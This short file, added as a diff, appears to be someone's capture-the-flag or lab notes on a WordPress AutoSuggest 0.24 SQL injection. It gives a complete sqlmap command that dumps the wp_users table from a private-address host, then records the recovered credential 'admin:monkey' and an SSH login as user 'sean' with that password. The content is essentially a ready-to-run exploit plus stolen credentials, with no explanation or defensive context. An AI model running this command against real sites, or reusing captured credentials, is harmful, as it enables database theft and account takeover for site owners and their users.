@@ -1,0 +1,8 @@
+WordPress Plugin AutoSuggest 0.24 - 'wpas_keys' SQL Injection
+
+sqlmap -u "http://10.1.1.246/wp/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1" -p wpas_keys --technique BT --dbms MYSQL --risk 3 --level 5 -D wordpress -T wp_users --tamper space2comment --dump
+
+admin:monkey
+
+ssh sean@10.1.1.246
+pass: monkey
